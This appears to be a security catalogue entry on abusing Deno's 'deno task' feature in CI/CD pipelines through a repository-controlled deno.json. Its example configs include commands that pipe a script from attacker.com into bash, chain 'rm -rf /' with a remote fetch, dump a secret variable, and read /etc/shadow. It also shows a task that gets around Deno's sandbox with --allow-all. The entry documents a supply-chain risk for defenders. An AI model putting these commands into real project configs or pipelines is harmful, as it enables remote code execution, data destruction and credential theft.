---
title: deno
tags:
  - cli
  - config-file
  - eval-sh
references:
  - https://deno.land/manual/tools/deno_task
  - https://deno.land/manual/getting_started/configuration_file
files: [deno.json,deno.jsonc,package.json]
---

Deno is a modern, secure runtime for JavaScript, TypeScript, and WebAssembly. It aims to provide a secure and productive environment with a robust built-in toolchain.

## LOTP Exploitation Method: `deno task`

Deno's `deno task` subcommand allows users to define and execute arbitrary shell commands via the `tasks` field in a `deno.json` (or `deno.jsonc`) file. This feature is the primary vector for LOTP exploitation in Deno. When a CI/CD pipeline invokes `deno task <task_name>`, the associated shell command, entirely controlled by the repository, is executed directly on the CI runner.

## Configuration Details

The `deno.json` (or `deno.jsonc`) file is automatically detected by Deno in the current working directory or parent directories. An attacker can modify this file to define malicious tasks.

**`deno.json`**:
```json
{
  "tasks": {
    "malicious-rce": "sh -c 'curl http://attacker.com/bad_script.sh | bash'",
    "exfil-flag": "echo $FLAG > /tmp/pwned"
  }
}
```

When a CI/CD pipeline runs `deno task <task_name>` (e.g., `deno task exfil-flag`), the shell command defined in the `deno.json` file is executed.

## Impact

An attacker controlling the `deno.json` file can achieve:

*   **Remote Code Execution (RCE)**: By defining tasks that execute arbitrary shell commands.
    ```json
    {
      "tasks": {
        "pwn": "rm -rf / && curl http://attacker.com/exfil.sh | sh"
      }
    }
    ```
*   **File System Access**: Read from or write to files on the CI runner using shell commands (e.g., `cat /etc/shadow`, `echo "malicious" > file.txt`).
*   **Environment Variable Manipulation**: Set or modify environment variables, influencing subsequent pipeline steps (e.g., `export ATTACKER_VAR="value"`).
*   **Network Exfiltration**: Initiate network connections to exfiltrate sensitive data using tools like `curl` or `wget`.

## Bypassing Deno's Sandbox

While `deno run` and `deno test` are sandboxed by default and require explicit command-line flags (e.g., `--allow-all`) for I/O, `deno task` directly executes shell commands. This means an attacker can define a task that *itself* invokes `deno run` with `--allow-all`, effectively bypassing Deno's inherent security model for the executed script.
```json
{
  "tasks": {
    "escalate": "deno run --allow-all ./malicious.ts"
  }
}
```
In this scenario, `malicious.ts` would run with full permissions if `deno task escalate` is invoked.
